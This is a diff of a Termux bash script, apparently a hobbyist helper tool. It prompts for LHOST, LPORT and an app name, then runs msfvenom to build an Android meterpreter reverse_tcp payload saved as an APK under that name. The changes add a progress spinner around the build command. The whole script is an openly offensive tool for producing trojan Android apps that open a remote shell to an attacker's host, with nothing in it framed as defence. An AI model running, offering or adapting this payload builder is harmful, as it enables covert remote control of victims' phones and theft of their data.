@@ -1,4 +1,4 @@
-#!/data/data/com.termux/files/usr/bin/bash
+#!/usr/bin/bash
 
 if [ ! -d "/data/data/com.termux/files/usr/opt/metasploit-framework" ]; then
 echo -e '\033[1;91m[!] Metasploit-framework not found.\033[0m'
@@ -15,6 +15,7 @@ echo -e "\e[1;3$(( $RANDOM * 6 / 32767 + 1 ))m
 █ ▀ █ ▄█ ▀▄▀ ██▄ █ ▀█ █▄█ █ ▀ █
 \e[1;3$(( $RANDOM * 6 / 32767 + 1 ))m▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
 \e[0m"
+
 echo -e '\033[1;92m[!] Choose your LHOST'
 read -p 'msvenom > ' lhost
 echo
@@ -23,8 +24,33 @@ read -p 'msvenom > ' lport
 echo
 echo -e '\033[1;92m[!] Choose your App Name'
 read -p 'msvenom > ' app
-echo -e '\033[0m\033[1;93m'
-msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > /sdcard/$app.apk
+printf '\033[0m\033[1;93m'
+
+spin () {
+
+local pid=$!
+local delay=0.25
+local spinner=( '' '.' '..' '...' )
+
+while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
+
+for i in "${spinner[@]}"
+do
+	tput civis
+	echo -ne "\033[1;94m\r[\e[1;92m+\e[1;94m] Creating Payload wait\033[1;92m$i\033[0m    \r";
+	sleep $delay
+        printf "\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b";
+done
+done
+tput cnorm
+printf "\e[1m[\e[1;92m√\e[0m\e[1m]\e[92m Payload Created\e\e[0m           ";
+echo "";
+
+}
+trap '' 2
+echo
+( msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > /sdcard/$app.apk ) & spin
+trap 5
 echo
 echo -e '\033[0m\033[1m[√] Payload Saved Dir : emulated/0/'
 echo
